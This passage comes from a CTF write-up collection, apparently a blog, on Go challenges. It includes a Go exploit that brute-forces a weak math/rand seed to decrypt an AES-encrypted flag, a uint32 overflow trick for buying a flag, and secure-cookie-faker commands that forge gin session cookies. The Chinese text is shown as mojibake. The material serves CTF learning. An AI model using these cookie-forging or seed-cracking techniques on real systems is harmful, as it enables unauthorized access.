&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag è¢« AES CBC åŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Š&lt;/p>
&lt;p>ç§å­ç”Ÿæˆæ˜¯é  &lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code> å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;h2 id="mathrandæœªè°ƒç”¨seedé»˜è®¤ç§å­ä¸º1">math/randæœªè°ƒç”¨Seedé»˜è®¤ç§å­ä¸º1&lt;/h2>
&lt;h3 id="wmctf2020gogogo">[WMCTF2020]GOGOGO&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">wp&lt;/a>&lt;/p>
&lt;h2 id="uint32æ•´æ•°æº¢å‡º">uint32æ•´æ•°æº¢å‡º&lt;/h2>
&lt;p>uint32çš„èŒƒå›´æ˜¯0~4294967295&lt;/p>
&lt;h3 id="ç¾ŠåŸæ¯2021checkin_go">[ç¾ŠåŸæ¯2021]Checkin_Go&lt;/h3>
&lt;pre tabindex="0">&lt;code>u1, err1 := strconv.ParseUint(nowMoney,10,32)
u2, err2 := strconv.ParseUint(addMoney,10,32)
....
newMoney = uint32(u1) + uint32(u2)
&lt;/code>&lt;/pre>&lt;p>flag priceæ˜¯uint32ï¼Œä»¥adminèº«ä»½ï¼ˆä¼ªé€ cookieï¼‰åŠ åˆ°æº¢å‡ºï¼Œå˜å°ï¼Œå°±å¯ä»¥ä¹°äº†&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://yyz9.cn/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AF2021-checkin_go%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">wp&lt;/a>&lt;/p>
&lt;h2 id="ginæ¡†æ¶ä¼ªé€ cookie">ginæ¡†æ¶ä¼ªé€ cookie&lt;/h2>
&lt;h3 id="secure-cookie-faker">secure-cookie-faker&lt;/h3>
&lt;p>å·¥å…·ï¼š&lt;a href="https://github.com/EddieIvan01/secure-cookie-faker">secure-cookie-faker&lt;/a>&lt;/p>
&lt;p>decode:&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe dec -c &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>æœ‰type detailçš„å°±æ˜¯object string&lt;/p>
&lt;p>encode:&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;{user: admin, id: 0[int]}&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>-o &lt;/code>: object stringï¼Œits like a K-V map, it should have type hints&lt;/li>
&lt;li>&lt;code>-n&lt;/code> : cookie name, its required because the HMAC hash&amp;rsquo;s generation relies on it&lt;/li>
&lt;li>&lt;code>-k&lt;/code> : secret key(s), could be multiple: &lt;code>-k &amp;quot;key1, key2&amp;quot;&lt;/code>, the first is hash key, and the second is encrypt block key&lt;/li>
&lt;/ul>
&lt;p>when element&amp;rsquo;s type is &lt;code>string&lt;/code>, the type tag can be omitted&lt;/p>
&lt;p>type tag can only be &lt;code>int&lt;/code>, &lt;code>uint&lt;/code>, &lt;code>float&lt;/code>, &lt;code>bool&lt;/code>, &lt;code>string&lt;/code>, &lt;code>byte&lt;/code>&lt;/p>
&lt;p>change serializer&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;some-string&amp;#34; -way json
.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;{id: 0[int]}&amp;#34; -way json
.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;some-string&amp;#34; -way nop
.\secure-cookie-faker.exe dec -c &amp;#34;MTU2NjkxMjI4NXxleUoxYzJWeUlqb2lZV1J0YVc0aWZRbz18OibftwH33BZStXtep7TbN_mbyk8RftQe9t_wxCJXhHo=&amp;#34; -way json
&lt;/code>&lt;/pre>&lt;h3 id="è„šæœ¬">è„šæœ¬&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-contrib/sessions&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-contrib/sessions/cookie&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-gonic/gin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">gin&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Default&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">storage&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewStore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">randomChar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sessions&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sessions&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;o&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">storage&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">GET&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cookieHandler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0:8002&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
